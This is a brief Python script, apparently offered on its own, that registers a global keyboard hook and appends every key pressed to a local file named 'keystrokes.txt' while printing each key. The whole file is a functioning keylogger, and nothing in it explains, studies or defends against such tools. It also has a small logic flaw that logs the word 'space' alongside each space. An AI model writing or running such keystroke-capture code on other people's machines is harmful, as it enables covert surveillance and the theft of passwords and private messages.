import keyboard

log_file = 'keystrokes.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        if event.name == "space":
            f.write(' ')
        if event.name == "enter":
            f.write('\n')
        else:
            f.write('{}'.format(event.name))
            
    print("entered: " + event.name)

keyboard.on_press(on_key_press)

keyboard.wait()